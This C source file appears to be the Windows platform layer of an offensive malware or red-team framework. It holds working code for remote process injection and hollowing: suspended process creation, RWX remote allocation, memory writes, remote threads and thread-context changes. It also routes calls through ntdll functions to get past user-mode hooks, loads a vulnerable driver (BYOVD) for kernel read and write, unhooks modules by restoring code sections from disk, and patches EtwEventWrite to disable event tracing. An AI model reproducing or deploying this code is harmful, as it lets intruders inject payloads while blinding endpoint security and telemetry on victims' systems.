#ifdef _WIN32

#include "../pal.h"
#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "../byovd.h"   // for load_byovd, etc.

struct PalProcess {
    HANDLE process;
    HANDLE thread;
    DWORD pid;
};

// ------------------------------------------------------------------
// Global flag for direct syscalls
// ------------------------------------------------------------------
static int g_useDirectSyscalls = 0;

void pal_set_use_direct_syscalls(int flag) {
    g_useDirectSyscalls = flag;
}

// ------------------------------------------------------------------
// Helper: get ntdll function pointers
// ------------------------------------------------------------------
static HMODULE hNtdll = NULL;
static NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG) = NULL;
static NTSTATUS (NTAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T) = NULL;
static NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID) = NULL;
/* Some MSVC Windows SDK variants do not expose PCLIENT_ID in the headers used here.
   Use generic pointer types for the client id / object attributes parameters to avoid
   depending on those typedefs. */
static NTSTATUS (NTAPI *pNtOpenProcess)(PHANDLE, ACCESS_MASK, PVOID, PVOID) = NULL;

static int init_ntdll_functions(void) {
    if (hNtdll) return 0;
    hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return -1;
    pNtAllocateVirtualMemory = (NTSTATUS (NTAPI*)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG))
        GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory = (NTSTATUS (NTAPI*)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T))
        GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtCreateThreadEx = (NTSTATUS (NTAPI*)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID))
        GetProcAddress(hNtdll, "NtCreateThreadEx");
    pNtOpenProcess = (NTSTATUS (NTAPI*)(PHANDLE,ACCESS_MASK,PVOID,PVOID))
        GetProcAddress(hNtdll, "NtOpenProcess");
    if (!pNtAllocateVirtualMemory || !pNtWriteVirtualMemory || !pNtCreateThreadEx || !pNtOpenProcess)
        return -1;
    return 0;
}

// ------------------------------------------------------------------
// Process Management
// ------------------------------------------------------------------
int pal_create_process_suspended(const char* image_path, PalProcess** out) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(NULL, (LPSTR)image_path, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi))
        return -1;
    PalProcess* p = (PalProcess*)malloc(sizeof(PalProcess));
    p->process = pi.hProcess;
    p->thread  = pi.hThread;
    p->pid     = pi.dwProcessId;
    *out = p;
    return 0;
}

int pal_terminate_process(PalProcess* proc) {
    return TerminateProcess(proc->process, 0) ? 0 : -1;
}

int pal_wait_for_process(PalProcess* proc) {
    return WaitForSingleObject(proc->process, INFINITE) == WAIT_OBJECT_0 ? 0 : -1;
}

void pal_close_process(PalProcess* proc) {
    if (proc) {
        CloseHandle(proc->process);
        CloseHandle(proc->thread);
        free(proc);
    }
}

uint32_t pal_get_pid(PalProcess* proc) {
    return proc ? proc->pid : 0;
}

// ------------------------------------------------------------------
// Remote Memory Operations with syscall support
// ------------------------------------------------------------------
void* pal_allocate_memory_remote(PalProcess* proc, size_t size, int protection) {
    if (g_useDirectSyscalls) {
        if (init_ntdll_functions() != 0) return NULL;
        void* addr = NULL;
        SIZE_T sz = size;
        ULONG flProtect;
        switch (protection) {
            case 0x01: flProtect = PAGE_EXECUTE; break;
            case 0x02: flProtect = PAGE_READWRITE; break;
            case 0x03: flProtect = PAGE_EXECUTE_READWRITE; break;
            case 0x04: flProtect = PAGE_READONLY; break;
            default:   flProtect = PAGE_READWRITE; break;
        }
        NTSTATUS status = pNtAllocateVirtualMemory(proc->process, &addr, 0, &sz,
                                                   MEM_COMMIT | MEM_RESERVE, flProtect);
        if (status == 0) return addr;
        return NULL;
    } else {
        DWORD flProtect;
        switch (protection) {
            case 0x01: flProtect = PAGE_EXECUTE; break;
            case 0x02: flProtect = PAGE_READWRITE; break;
            case 0x03: flProtect = PAGE_EXECUTE_READWRITE; break;
            case 0x04: flProtect = PAGE_READONLY; break;
            default:   flProtect = PAGE_READWRITE; break;
        }
        return VirtualAllocEx(proc->process, NULL, size, MEM_COMMIT | MEM_RESERVE, flProtect);
    }
}

int pal_write_memory_remote(PalProcess* proc, void* dest, const void* src, size_t size) {
    if (g_useDirectSyscalls) {
        if (init_ntdll_functions() != 0) return -1;
        SIZE_T written;
        NTSTATUS status = pNtWriteVirtualMemory(proc->process, dest, (PVOID)src, size, &written);
        return (status == 0 && written == size) ? 0 : -1;
    } else {
        SIZE_T written;
        return (WriteProcessMemory(proc->process, dest, src, size, &written) && written == size) ? 0 : -1;
    }
}

int pal_read_memory_remote(PalProcess* proc, const void* src, void* dest, size_t size) {
    SIZE_T read;
    return (ReadProcessMemory(proc->process, src, dest, size, &read) && read == size) ? 0 : -1;
}

int pal_protect_memory_remote(PalProcess* proc, void* addr, size_t size, int protection) {
    DWORD old, flProtect;
    switch (protection) {
        case 0x01: flProtect = PAGE_EXECUTE; break;
        case 0x02: flProtect = PAGE_READWRITE; break;
        case 0x03: flProtect = PAGE_EXECUTE_READWRITE; break;
        case 0x04: flProtect = PAGE_READONLY; break;
        default:   flProtect = PAGE_READWRITE; break;
    }
    return VirtualProtectEx(proc->process, addr, size, flProtect, &old) ? 0 : -1;
}

int pal_free_memory_remote(PalProcess* proc, void* addr) {
    return VirtualFreeEx(proc->process, addr, 0, MEM_RELEASE) ? 0 : -1;
}

// ------------------------------------------------------------------
// Remote Thread Operations with syscall support
// ------------------------------------------------------------------
int pal_create_remote_thread(PalProcess* proc, void* start_routine, void* arg) {
    if (g_useDirectSyscalls) {
        if (init_ntdll_functions() != 0) return -1;
        HANDLE hThread;
        NTSTATUS status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, proc->process,
                                            start_routine, arg, 0, 0, 0, 0, NULL);
        if (status != 0) return -1;
        CloseHandle(hThread);
        return 0;
    } else {
        HANDLE h = CreateRemoteThread(proc->process, NULL, 0,
                                      (LPTHREAD_START_ROUTINE)start_routine,
                                      arg, 0, NULL);
        if (!h) return -1;
        CloseHandle(h);
        return 0;
    }
}

int pal_get_thread_context(PalProcess* proc, void* context) {
    CONTEXT* ctx = (CONTEXT*)context;
    ctx->ContextFlags = CONTEXT_FULL;
    return GetThreadContext(proc->thread, ctx) ? 0 : -1;
}

int pal_set_thread_context(PalProcess* proc, const void* context) {
    return SetThreadContext(proc->thread, (CONTEXT*)context) ? 0 : -1;
}

// ------------------------------------------------------------------
// Resume Process (using NtResumeProcess, fallback to ResumeThread)
// ------------------------------------------------------------------
int pal_resume_process(PalProcess* proc) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        typedef NTSTATUS (NTAPI *NtResumeProcess_t)(HANDLE);
        NtResumeProcess_t NtResumeProcess = (NtResumeProcess_t)GetProcAddress(ntdll, "NtResumeProcess");
        if (NtResumeProcess) {
            NTSTATUS status = NtResumeProcess(proc->process);
            if (status == 0) {
                printf("[DEBUG] NtResumeProcess succeeded\n");
                return 0;
            } else {
                printf("[DEBUG] NtResumeProcess failed: 0x%X\n", status);
            }
        }
    }
    DWORD count = ResumeThread(proc->thread);
    if (count == (DWORD)-1) {
        printf("[DEBUG] ResumeThread failed (error: %lu)\n", GetLastError());
        return -1;
    }
    printf("[DEBUG] ResumeThread succeeded (previous suspend count: %lu)\n", count);
    while (count > 1) {
        count = ResumeThread(proc->thread);
        if (count == (DWORD)-1) {
            printf("[DEBUG] ResumeThread loop failed (error: %lu)\n", GetLastError());
            return -1;
        }
        printf("[DEBUG] ResumeThread: suspend count now %lu\n", count);
    }
    return 0;
}

// ------------------------------------------------------------------
// Kernel / Driver Operations (BYOVD) – via byovd_loader.c
// ------------------------------------------------------------------
int pal_load_driver(const char* driver_path) {
    return load_byovd(driver_path);
}
int pal_unload_driver(const char* driver_name) {
    return unload_byovd(driver_name);
}
int pal_read_kernel_memory(uintptr_t address, void* buffer, size_t size) {
    return read_kernel_memory(address, buffer, size);
}
int pal_write_kernel_memory(uintptr_t address, const void* buffer, size_t size) {
    return write_kernel_memory(address, buffer, size);
}

// ------------------------------------------------------------------
// API Unhooking (restores executable sections from disk)
// ------------------------------------------------------------------
int pal_unhook_module(const char* module_name) {
    HMODULE hMod = GetModuleHandleA(module_name);
    if (!hMod) return -1;

    char path[MAX_PATH];
    if (!GetModuleFileNameA(hMod, path, sizeof(path))) return -1;

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return -1;

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) { CloseHandle(hFile); return -1; }

    LPVOID clean = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!clean) { CloseHandle(hFile); return -1; }

    DWORD bytesRead;
    if (!ReadFile(hFile, clean, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        VirtualFree(clean, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return -1;
    }
    CloseHandle(hFile);

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)clean;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) { VirtualFree(clean, 0, MEM_RELEASE); return -1; }
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)clean + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) { VirtualFree(clean, 0, MEM_RELEASE); return -1; }

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            LPVOID target = (BYTE*)hMod + pSec[i].VirtualAddress;
            LPVOID source = (BYTE*)clean + pSec[i].VirtualAddress;
            DWORD size = pSec[i].Misc.VirtualSize;
            if (size == 0) continue;

            DWORD oldProtect;
            if (!VirtualProtect(target, size, PAGE_EXECUTE_READWRITE, &oldProtect))
                continue;
            memcpy(target, source, size);
            VirtualProtect(target, size, oldProtect, &oldProtect);
        }
    }

    VirtualFree(clean, 0, MEM_RELEASE);
    return 0;
}

int pal_bypass_telemetry(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return -1;

    FARPROC pFunc = GetProcAddress(ntdll, "EtwEventWrite");
    if (!pFunc) return -1;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 }; // xor eax,eax; ret
    DWORD oldProtect;
    if (!VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        return -1;
    memcpy(pFunc, patch, sizeof(patch));
    VirtualProtect(pFunc, sizeof(patch), oldProtect, &oldProtect);
    return 0;
}

// ------------------------------------------------------------------
// Direct Syscall Wrappers (exposed for external use)
// ------------------------------------------------------------------
int pal_syscall_open_process(uint32_t pid, int access, PalProcess** out) {
    if (init_ntdll_functions() != 0) return -1;
    HANDLE hProcess;
    CLIENT_ID cid = { (HANDLE)(uintptr_t)pid, NULL };
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    NTSTATUS status = pNtOpenProcess(&hProcess, access, &oa, &cid);
    if (status != 0) return -1;
    PalProcess* p = (PalProcess*)malloc(sizeof(PalProcess));
    p->process = hProcess;
    p->thread = NULL;
    p->pid = pid;
    *out = p;
    return 0;
}
int pal_syscall_allocate_memory(PalProcess* proc, void** addr, size_t size, int protection) {
    if (init_ntdll_functions() != 0) return -1;
    SIZE_T sz = size;
    ULONG flProtect;
    switch (protection) {
        case 0x01: flProtect = PAGE_EXECUTE; break;
        case 0x02: flProtect = PAGE_READWRITE; break;
        case 0x03: flProtect = PAGE_EXECUTE_READWRITE; break;
        case 0x04: flProtect = PAGE_READONLY; break;
        default:   flProtect = PAGE_READWRITE; break;
    }
    NTSTATUS status = pNtAllocateVirtualMemory(proc->process, addr, 0, &sz,
                                               MEM_COMMIT | MEM_RESERVE, flProtect);
    return (status == 0) ? 0 : -1;
}
int pal_syscall_write_memory(PalProcess* proc, void* dest, const void* src, size_t size) {
    if (init_ntdll_functions() != 0) return -1;
    SIZE_T written;
    NTSTATUS status = pNtWriteVirtualMemory(proc->process, dest, (PVOID)src, size, &written);
    return (status == 0 && written == size) ? 0 : -1;
}

#endif // _WIN32